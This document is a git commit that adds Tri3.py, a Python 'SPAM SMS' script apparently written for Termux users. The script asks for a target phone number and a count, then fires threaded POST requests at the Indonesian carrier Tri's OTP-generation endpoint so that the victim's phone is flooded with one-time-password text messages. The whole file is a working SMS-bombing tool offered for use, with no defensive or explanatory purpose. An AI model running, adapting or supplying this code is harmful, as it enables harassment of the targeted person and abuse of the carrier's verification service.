1f654866fd4510fe070f9afca3d5bbc13b4cd7e3
The Termux Choice <49187820+thetermuxchoice@users.noreply.github.com>
2019-04-22 14:55:20 +0700

    Create Tri3.py

---
+++ Tri3.py
@@ -0,0 +1,45 @@
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+# Coded by @thetermuxchoice
+"""
+Copyright ©2019 by thetermuxchoice. All rights reserved.
+https://github.com/thetermuxchoice
+"""
+from multiprocessing.pool import ThreadPool
+try:
+	import os, time, requests, sys
+except ModuleNotFoundError:
+	print("\nYou have not installed the request module!")
+	print("$ pip install requests\n")
+	exit()
+  
+banner=("""\033[1;36m
+     _  _
+   _| || |_  \033[1;32m..::SPAM SMS Tri3 UNLIMITED::..\033[1;36m
+  |_  ..  _| \033[1;31mCoded by  : @thetermuxchoice\033[1;36m
+  |_      _| \033[1;31mContact   : Henrycko.Developer@gmail.com\033[1;32m
+    |_||_|   \033[1;31mThanks To : https://tri.co.id
+    
+""")
+
+os.system('clear')
+print(banner)
+no = input("\033[1;37mMassukan Nomor Target =>\033[1;32m")
+tot = int(input("\033[1;37mJumlah Spam =>\033[1;32m"))
+spam = {'msisdn':no}
+idk = '200'
+def main(arg):
+	try:
+		r = requests.post('https://registrasi.tri.co.id/daftar/generateOTP?',data = spam)
+#		print(r.text)
+		if str(idk) in str(r.text):
+			print("\033[1;32m[+] SUKSES")
+		else:
+			print("\033[1;31m[-] GAGAL")
+	except: pass
+
+jobs = []
+for x in range(tot):
+    jobs.append(x)
+p=ThreadPool(10)
+p.map(main,jobs)
